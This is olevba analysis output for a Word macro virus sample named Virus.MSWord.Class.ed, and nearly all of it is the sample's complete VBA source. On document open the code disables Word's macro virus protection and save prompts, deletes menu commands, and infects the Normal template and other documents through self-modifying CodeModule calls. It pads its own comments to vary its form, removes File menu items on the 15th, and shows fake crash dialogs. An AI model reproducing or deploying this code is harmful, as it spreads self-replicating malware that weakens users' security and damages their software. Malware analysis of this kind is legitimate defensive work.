olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
On Error Resume Next
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
CommandBars("Tools").Controls("Options...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
Options.VirusProtection = False
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
Options.SaveNormalPrompt = False
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
CommandBars("Format").Controls("Style...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
Options.ConfirmConversions = False
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
CommandBars("Tools").Controls("Customize...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 Then GoTo Epp
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    Set Eho = NormalTemplate.VBProject.VBComponents.Item(1)
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\system.sys"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 5, "Sub AutoClose"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Sub ToolsMacro"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Sub ViewVBCode"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End If
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    Set Eho = ActiveDocument.VBProject.VBComponents.Item(1)
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Private Sub TM"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Private Sub VVBC"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End If
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
With Eho.CodeModule
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    For x = 1 To 4
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    .deletelines 1
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    Next x
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End With
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
With Eho.CodeModule
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    For x = 2 To 104 Step 2
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    .replaceline x, "'" & Now & Application.ActivePrinter & Application.UserName & "sdjw3456ot76 weor9w58349583" & Now
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    Next x
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    .replaceline 106, "'MV Version 1e"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End With
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
If Day(Now) = 15 Then
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("Page Setup...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("Print Preview").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("Print...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("Exit").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("New...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("Open...").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
    CommandBars("File").Controls("Close").Delete
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End If
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
Epp:
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End Sub
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
Private Sub TM()
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End Sub
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
Private Sub VVBC()
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'2004-05-29 19:18:56Canon  BJC-4400 on LPT1:Jan Lingemarksdjw3456ot76 weor9w583495832004-05-29 19:18:56
End Sub
'MV Version 1e


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

